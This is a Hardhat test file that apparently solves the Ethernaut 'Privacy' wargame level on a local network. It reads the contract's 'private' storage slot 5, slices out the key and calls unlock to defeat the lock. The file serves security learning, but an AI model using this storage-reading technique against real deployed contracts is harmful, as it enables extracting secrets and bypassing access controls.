import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Privacy exploit", () => {
  async function deployPrivacyFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy factory contract
    const PrivacyFactory = await ethers.getContractFactory("PrivacyFactory");
    const factory = await PrivacyFactory.connect(deployer).deploy();
    await factory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const privacyAddress = await factory.connect(attacker).callStatic.createInstance(attacker.address);

    // Create a level instance
    const tx = await factory.createInstance(attacker.address);
    await tx.wait(1);

    // Get deployed instance of Elevator contract
    const privacy = await ethers.getContractAt("Privacy", privacyAddress);

    return { attacker, privacy, factory };
  }

  it("Should unlock the contract", async () => {
    const { attacker, privacy, factory } = await loadFixture(deployPrivacyFixture);

    const data = await attacker.provider?.getStorageAt(privacy.address, 5)!;

    const key = data.slice(0, 34);

    const tx = await privacy.unlock(key);
    await tx.wait(1);

    const locked = await privacy.locked();
    expect(locked).to.be.false;

    // Validate the instance using Ethernaut validation.
    // Submit the instance
    const success = await factory.validateInstance(privacy.address, attacker.address);
    expect(success).to.be.true;
  });
});
